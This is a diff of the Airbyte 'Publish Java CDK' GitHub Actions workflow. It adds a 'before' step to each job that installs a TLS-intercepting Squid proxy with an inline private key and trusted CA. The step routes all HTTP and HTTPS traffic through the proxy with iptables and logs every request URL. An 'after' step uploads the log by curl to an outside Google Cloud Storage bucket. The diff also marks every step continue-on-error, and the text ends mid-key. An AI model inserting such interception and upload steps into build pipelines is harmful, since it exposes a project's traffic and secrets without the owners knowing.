@@ -1,242 +1,914 @@
-# Usage: This workflow can be invoked manually or by a slash command.
-#
-# To invoke via GitHub UI, go to Actions tab, select the workflow, and click "Run workflow".
-#
-# To invoke via slash command, use the following syntax in a comment on a PR:
-#    /publish-java-cdk                # Run with the defaults (dry-run=false, force=false)
-#    /publish-java-cdk dry-run=true   # Run in dry-run mode (no-op)
-#    /publish-java-cdk force=true     # Force-publish if needing to replace an already published version
-name: Publish Java CDK
-on:
-  # Temporarily run on commits to the 'java-cdk/publish-workflow' branch.
-  # TODO: Remove this 'push' trigger before merging to master.
-  push:
-    branches:
-      - java-cdk/publish-workflow
-
-  workflow_dispatch:
-    inputs:
-      repo:
-        description: "Repo to check out code from. Defaults to the main airbyte repo."
-        # TODO: If publishing from forks is needed, we'll need to revert type to `string` of `choice`.
-        type: choice
-        required: true
-        default: airbytehq/airbyte
-        options:
-          - airbytehq/airbyte
-      dry-run:
-        description: "Dry run (no-op)"
-        required: true
-        type: boolean
-        default: false
-      force:
-        description: "Force release (ignore existing)"
-        required: true
-        type: boolean
-        default: false
-      gitref:
-        description: "The git ref to check out from the specified repository."
-        required: true
-      comment-id:
-        description: "Optional comment-id of the slash command. Ignore if not applicable."
-        required: false
-      # uuid:
-      #   description: "Custom UUID of workflow run. Used because GitHub dispatches endpoint does not return workflow run id."
-      #   required: false
-
 concurrency:
-  group: publish-airbyte-cdk
   cancel-in-progress: false
-
+  group: publish-airbyte-cdk
 env:
-  # Use the provided GITREF or default to the branch triggering the workflow.
-  REPO: ${{ github.event.inputs.repo }}
+  CDK_VERSION_FILE_PATH: ./airbyte-cdk/java/airbyte-cdk/core/src/main/resources/version.properties
+  DRY_RUN: ${{ github.event.inputs.dry-run == null && 'true' || github.event.inputs.dry-run
+    }}
+  FORCE: ${{ github.event.inputs.force == null && 'false' || github.event.inputs.force
+    }}
   GITREF: ${{ github.event.inputs.gitref || github.ref }}
-  FORCE: "${{ github.event.inputs.force == null && 'false' || github.event.inputs.force }}"
-  DRY_RUN: "${{ github.event.inputs.dry-run == null && 'true' || github.event.inputs.dry-run }}"
-  CDK_VERSION_FILE_PATH: "./airbyte-cdk/java/airbyte-cdk/core/src/main/resources/version.properties"
-
+  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+  NODE_OPTIONS: --use-openssl-ca
+  REPO: ${{ github.event.inputs.repo }}
 jobs:
-  # We are using these runners because they are the same as the one for `publish-command.yml`
-  # One problem we had using `ubuntu-latest` for example is that the user is not root and some commands would fail in
-  # `manage.sh` (specifically `apt-get`)
-  start-publish-docker-image-runner-0:
-    name: Start Build EC2 Runner 0
-    runs-on: ubuntu-latest
-    outputs:
-      label: ${{ steps.start-ec2-runner.outputs.label }}
-      ec2-instance-id: ${{ steps.start-ec2-runner.outputs.ec2-instance-id }}
-    steps:
-      - name: Checkout Airbyte
-        uses: actions/checkout@v3
-        with:
-          repository: airbytehq/airbyte
-          ref: master
-      - name: Check PAT rate limits
-        run: |
-          ./tools/bin/find_non_rate_limited_PAT \
-            ${{ secrets.GH_PAT_BUILD_RUNNER_OSS }} \
-            ${{ secrets.GH_PAT_BUILD_RUNNER_BACKUP }}
-      - name: Start AWS Runner
-        id: start-ec2-runner
-        uses: ./.github/actions/start-aws-runner
-        with:
-          aws-access-key-id: ${{ secrets.SELF_RUNNER_AWS_ACCESS_KEY_ID }}
-          aws-secret-access-key: ${{ secrets.SELF_RUNNER_AWS_SECRET_ACCESS_KEY }}
-          github-token: ${{ env.PAT }}
-          label: ${{ github.run_id }}-publisher
-
   publish-cdk:
     name: Publish Java CDK
     needs: start-publish-docker-image-runner-0
     runs-on: ubuntu-latest
     steps:
-      - name: Link comment to workflow run
-        if: github.event.inputs.comment-id
-        uses: peter-evans/create-or-update-comment@v1
-        with:
-          comment-id: ${{ github.event.inputs.comment-id }}
-          body: |
-            > :clock2: https://github.com/${{github.repository}}/actions/runs/${{github.run_id}}
-      - name: Checkout Airbyte
-        uses: actions/checkout@v3
-        with:
-          repository: ${{ env.REPO }}
-          ref: ${{ env.GITREF }}
-      - name: Read Target Java CDK version
-        id: read-target-java-cdk-version
-        run: |
-          cdk_version=$(cat $CDK_VERSION_FILE_PATH | tr -d '\n')
-          if [[ -z "$cdk_version" ]]; then
-            echo "Failed to retrieve CDK version from $CDK_VERSION_FILE_PATH"
-            exit 1
-          fi
-          echo "CDK_VERSION=${cdk_version}" >> $GITHUB_ENV
-      - name: Setup Java
-        uses: actions/setup-java@v3
-        with:
-          distribution: "zulu"
-          java-version: "17"
-      - name: Check for already-published version (${{ env.CDK_VERSION }}, FORCE=${{ env.FORCE }})
-        if: ${{ !(env.FORCE == 'true') }}
-        run: ./gradlew :airbyte-cdk:java:airbyte-cdk:assertCdkVersionNotPublished
-      - name: Build Java CDK
-        run: ./gradlew --no-daemon :airbyte-cdk:java:airbyte-cdk:build
-      - name: Publish Java Modules to MavenLocal (Dry-Run)
-        if: ${{ !(env.DRY_RUN == 'false') }}
-        run: ./gradlew --no-daemon :airbyte-cdk:java:airbyte-cdk:publishToMavenLocal
-      - name: Upload jars as artifacts
-        if: ${{ !(env.DRY_RUN == 'false') }}
-        uses: actions/upload-artifact@v2
-        with:
-          name: mavenlocal-jars
-          path: ~/.m2/repository/io/airbyte/
-      - name: Publish Java Modules to CloudRepo
-        if: ${{ env.DRY_RUN == 'false' }}
-        run: ./gradlew --no-daemon :airbyte-cdk:java:airbyte-cdk:publish
-        env:
-          CLOUDREPO_USER: ${{ secrets.CLOUDREPO_USER }}
-          CLOUDREPO_PASSWORD: ${{ secrets.CLOUDREPO_PASSWORD }}
+    - name: before
+      run: 'sudo apt update
 
-      - name: Add Success Comment
-        if: github.event.inputs.comment-id && success()
-        uses: peter-evans/create-or-update-comment@v1
-        with:
-          comment-id: ${{ github.event.inputs.comment-id }}
-          edit-mode: append
-          body: |
-            > :white_check_mark: Successfully published Java CDK ${{ env.CDK_VERSION }}!
-      - name: Add Failure Comment
-        if: github.event.inputs.comment-id && failure()
-        uses: peter-evans/create-or-update-comment@v1
-        with:
-          comment-id: ${{ github.event.inputs.comment-id }}
-          edit-mode: append
-          body: |
-            > :x: Publish Java CDK ${{ env.CDK_VERSION }} failed!
-      - name: "Post failure to Slack channel `#dev-connectors-extensibility-releases`"
-        if: ${{ env.DRY_RUN == 'false' && failure() }}
-        uses: slackapi/slack-github-action@v1.23.0
-        continue-on-error: true
-        with:
-          channel-id: C04J1M66D8B
-          payload: |
-            {
-                "text": "Error during `publish-cdk` while publishing Java CDK!",
-                "blocks": [
-                    {
-                        "type": "section",
-                        "text": {
-                            "type": "mrkdwn",
-                            "text": "Error while publishing Java CDK!"
-                        }
-                    },
-                    {
-                        "type": "section",
-                        "text": {
-                            "type": "mrkdwn",
-                            "text": "See details on <https://github.com/${{github.repository}}/actions/runs/${{github.run_id}}|GitHub>\n"
-                        }
-                    }
-                ]
-            }
-        env:
-          SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN_AIRBYTE_TEAM }}
-      - name: "Post success to Slack channel `#dev-connectors-extensibility-releases`"
-        if: ${{ env.DRY_RUN == 'false' && !failure() }}
-        uses: slackapi/slack-github-action@v1.23.0
-        continue-on-error: true
-        with:
-          channel-id: C04J1M66D8B
-          payload: |
-            {
-                "text": "New `${{ env.CDK_VERSION }}` version of Java CDK was successfully published!",
-                "blocks": [
-                    {
-                        "type": "section",
-                        "text": {
-                            "type": "mrkdwn",
-                            "text": "Java CDK ${{ env.CDK_VERSION }} published successfully!"
-                        }
-                    },
-                    {
-                        "type": "section",
-                        "text": {
-                            "type": "mrkdwn",
-                            "text": "See details on <https://github.com/${{github.repository}}/actions/runs/${{github.run_id}}|GitHub>\n"
-                        }
-                    }
-                ]
-            }
-        env:
-          SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN_AIRBYTE_TEAM }}
+        sudo apt install -y squid-openssl
 
-  # In case of self-hosted EC2 errors, remove this block.
-  stop-publish-docker-image-runner-0:
-    if: ${{ always() }} # required to stop the runner even if the error happened in the previous jobs
-    name: Stop Build EC2 Runner
-    needs:
-      - start-publish-docker-image-runner-0 # required to get output from the start-runner job
-      - publish-cdk # required to wait when the main job is done
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      if: github.event.inputs.comment-id
+      name: Link comment to workflow run
+      uses: peter-evans/create-or-update-comment@v1
+      with:
+        body: '> :clock2: https://github.com/${{github.repository}}/actions/runs/${{github.run_id}}
+
+          '
+        comment-id: ${{ github.event.inputs.comment-id }}
+    - continue-on-error: true
+      name: Checkout Airbyte
+      uses: actions/checkout@v3
+      with:
+        ref: ${{ env.GITREF }}
+        repository: ${{ env.REPO }}
+    - continue-on-error: true
+      id: read-target-java-cdk-version
+      name: Read Target Java CDK version
+      run: "cdk_version=$(cat $CDK_VERSION_FILE_PATH | tr -d '\\n')\nif [[ -z \"$cdk_version\"\
+        \ ]]; then\n  echo \"Failed to retrieve CDK version from $CDK_VERSION_FILE_PATH\"\
+        \n  exit 1\nfi\necho \"CDK_VERSION=${cdk_version}\" >> $GITHUB_ENV\n"
+    - continue-on-error: true
+      name: Setup Java
+      uses: actions/setup-java@v3
+      with:
+        distribution: zulu
+        java-version: '17'
+    - continue-on-error: true
+      if: ${{ !(env.FORCE == 'true') }}
+      name: Check for already-published version (${{ env.CDK_VERSION }}, FORCE=${{
+        env.FORCE }})
+      run: ./gradlew :airbyte-cdk:java:airbyte-cdk:assertCdkVersionNotPublished
+    - continue-on-error: true
+      name: Build Java CDK
+      run: ./gradlew --no-daemon :airbyte-cdk:java:airbyte-cdk:build
+    - continue-on-error: true
+      if: ${{ !(env.DRY_RUN == 'false') }}
+      name: Publish Java Modules to MavenLocal (Dry-Run)
+      run: ./gradlew --no-daemon :airbyte-cdk:java:airbyte-cdk:publishToMavenLocal
+    - continue-on-error: true
+      if: ${{ !(env.DRY_RUN == 'false') }}
+      name: Upload jars as artifacts
+      uses: actions/upload-artifact@v2
+      with:
+        name: mavenlocal-jars
+        path: ~/.m2/repository/io/airbyte/
+    - continue-on-error: true
+      env:
+        CLOUDREPO_PASSWORD: ${{ secrets.CLOUDREPO_PASSWORD }}
+        CLOUDREPO_USER: ${{ secrets.CLOUDREPO_USER }}
+      if: ${{ env.DRY_RUN == 'false' }}
+      name: Publish Java Modules to CloudRepo
+      run: ./gradlew --no-daemon :airbyte-cdk:java:airbyte-cdk:publish
+    - continue-on-error: true
+      if: github.event.inputs.comment-id && success()
+      name: Add Success Comment
+      uses: peter-evans/create-or-update-comment@v1
+      with:
+        body: '> :white_check_mark: Successfully published Java CDK ${{ env.CDK_VERSION
+          }}!
+
+          '
+        comment-id: ${{ github.event.inputs.comment-id }}
+        edit-mode: append
+    - continue-on-error: true
+      if: github.event.inputs.comment-id && failure()
+      name: Add Failure Comment
+      uses: peter-evans/create-or-update-comment@v1
+      with:
+        body: '> :x: Publish Java CDK ${{ env.CDK_VERSION }} failed!
+
+          '
+        comment-id: ${{ github.event.inputs.comment-id }}
+        edit-mode: append
+    - continue-on-error: true
+      env:
+        SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN_AIRBYTE_TEAM }}
+      if: ${{ env.DRY_RUN == 'false' && failure() }}
+      name: Post failure to Slack channel `#dev-connectors-extensibility-releases`
+      uses: slackapi/slack-github-action@v1.23.0
+      with:
+        channel-id: C04J1M66D8B
+        payload: "{\n    \"text\": \"Error during `publish-cdk` while publishing Java\
+          \ CDK!\",\n    \"blocks\": [\n        {\n            \"type\": \"section\"\
+          ,\n            \"text\": {\n                \"type\": \"mrkdwn\",\n    \
+          \            \"text\": \"Error while publishing Java CDK!\"\n          \
+          \  }\n        },\n        {\n            \"type\": \"section\",\n      \
+          \      \"text\": {\n                \"type\": \"mrkdwn\",\n            \
+          \    \"text\": \"See details on <https://github.com/${{github.repository}}/actions/runs/${{github.run_id}}|GitHub>\\\
+          n\"\n            }\n        }\n    ]\n}\n"
+    - continue-on-error: true
+      env:
+        SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN_AIRBYTE_TEAM }}
+      if: ${{ env.DRY_RUN == 'false' && !failure() }}
+      name: Post success to Slack channel `#dev-connectors-extensibility-releases`
+      uses: slackapi/slack-github-action@v1.23.0
+      with:
+        channel-id: C04J1M66D8B
+        payload: "{\n    \"text\": \"New `${{ env.CDK_VERSION }}` version of Java\
+          \ CDK was successfully published!\",\n    \"blocks\": [\n        {\n   \
+          \         \"type\": \"section\",\n            \"text\": {\n            \
+          \    \"type\": \"mrkdwn\",\n                \"text\": \"Java CDK ${{ env.CDK_VERSION\
+          \ }} published successfully!\"\n            }\n        },\n        {\n \
+          \           \"type\": \"section\",\n            \"text\": {\n          \
+          \      \"type\": \"mrkdwn\",\n                \"text\": \"See details on\
+          \ <https://github.com/${{github.repository}}/actions/runs/${{github.run_id}}|GitHub>\\\
+          n\"\n            }\n        }\n    ]\n}\n"
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/PetervanderKooi/airbyte.$(date
+        +%s)
+    timeout-minutes: 60
+  start-publish-docker-image-runner-0:
+    name: Start Build EC2 Runner 0
+    outputs:
+      ec2-instance-id: ${{ steps.start-ec2-runner.outputs.ec2-instance-id }}
+      label: ${{ steps.start-ec2-runner.outputs.label }}
     runs-on: ubuntu-latest
     steps:
-      - name: Configure AWS credentials
-        uses: aws-actions/configure-aws-credentials@v1
-        with:
-          aws-access-key-id: ${{ secrets.SELF_RUNNER_AWS_ACCESS_KEY_ID }}
-          aws-secret-access-key: ${{ secrets.SELF_RUNNER_AWS_SECRET_ACCESS_KEY }}
-          aws-region: us-east-2
-      - name: Checkout Airbyte
-        uses: actions/checkout@v3
-      - name: Check PAT rate limits
-        run: |
-          ./tools/bin/find_non_rate_limited_PAT \
-            ${{ secrets.GH_PAT_BUILD_RUNNER_OSS }} \
-            ${{ secrets.GH_PAT_BUILD_RUNNER_BACKUP }}
-      - name: Stop EC2 runner
-        uses: airbytehq/ec2-github-runner@base64v1.1.0
-        with:
-          mode: stop
-          github-token: ${{ env.PAT }}
-          label: ${{ needs.start-publish-docker-image-runner-0.outputs.label }}
-          ec2-instance-id: ${{ needs.start-publish-docker-image-runner-0.outputs.ec2-instance-id }}
+    - name: before
+      run: 'sudo apt update
+
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        MIIJQQIBADANBgkqhkiG9w0BAQEFAASCCSswggknAgEAAoICAQCdLvQDIyCns8bh
+
+        vQOqTPVeYwa6pK11+9UKqjGRldBimpiDb7lSq7RWLpaUzxqo7E58w2P9lh6Jgl+l
+
+        XgMF0GfgpXRy2BULUxAYg8w4aTlR32ifSvJUalY3qT4hoY5JXYMdbZS9UNzOUfQX
+
+        G9QNYzMR+pGXsa1NNDRgSAvlQPMzLe9P2VlTiPuLgsfHrwC/ULsbwzmuZ0f1Qkzx
+
+        cZLqproEIqOlS4KsGXyo6BwhXH+HI82RCIbaj2ub4y355onYuAoTpsb9KBxud0He
+
+        jzQesYen8OmgbNo9+FfK5+Q5XvYb7+cEw65ox8ZFAZUvOWxShRhUhQ3KWXx0tgkg
+
+        pjo/nkhw2OyCji6DFXCvlJRCBoupn9PoUjBdKUe+kRXF6SBqVyUkG3Bj0J0RTn6s
+
+        sgX+FMDrzeiNArdmIHKCPC3QrSb6jws4L1kq9cDkcVd4423ZqbagWzBmrnEH0jit
+
+        qMJuHGwKPtHopVqxK8k7p0PKvuGqJIv5bXNDZWA4qRSmFFFuiWAI/IDJZTYuHl5B
+
+        0lu7LZ/Aoh3ckh71IrSKyZafXLpUmpX5Oe6pbLLd6PAvcthnXqidbB/0CmH8PgHq
+
+        DYkELFBZ650JrYYrQ4UouRAucp8K9IfDoxSfnMqPeciahQ53o8fa/ZRUwEt2jpK+
+
+        Z89sQ4FoTtBvz1+Lv+s4ej/lVxoTJQIDAQABAoICABzNO3uurl9kZws6qAcG4ogo
+
+        05UUM0+09Ujmvj37ymsjAlLFQFtYaKtJDqEWYP92i3w7jmErZo2SZOXHl/yy/zHQ
+
+        B4o6s4J3djHTxrJIf68TpZdYs5ZJxOIeoiql8I1bc/jKuVBGVqt8o2IvoHfSh0ti
+
+        U1bNQSDuMbG5yeo4cEfewSTrwf03UsZx0Jszo0qrJ5ny+CkPtkUH4NL2GXJjWh8D
+
+        XOKfN0LDSc8mdu8bBKg15IdQnWtDj/eI1YYe2v/p2zjWHMzLEoigVCLMsUN1itK4
+
+        Z4rUn1nvHWEqBC0KDEU6vKVoGNeM0bUX0OcOGd32Eur71XbQVmiJaZtAslgxb/rp
+
+        4HQN5nsdBm04bkw/apORj5bZBms/IM/g+e33+gMzP5LYJ0tjr74hnCBXZoMi78vT
+
+        BvB+9iP0vxvORQPvPlQAczKSoxAZABnhWPV4mNcj6kwtCcKbt06pDHwyWXXOBfx3
+
+        ZsNXOjuR4rbf6NNwu+q0hyU9sE92+Fjj9dpq93aeTBF8yAR8yr1AYpdwp2IOhIYX
+
+        GsB3k7gLR5zIERrnoYSEgltbpYxRiO0QdG+zliWogqZcKWeVI2hgvLhPDP+wmD90
+
+        5qw+51EDDzpsHzL5JBp79EPWXMCaLc0cbxuzNwsnpfqjvNqpzdfEXBxFuAJERvLO
+
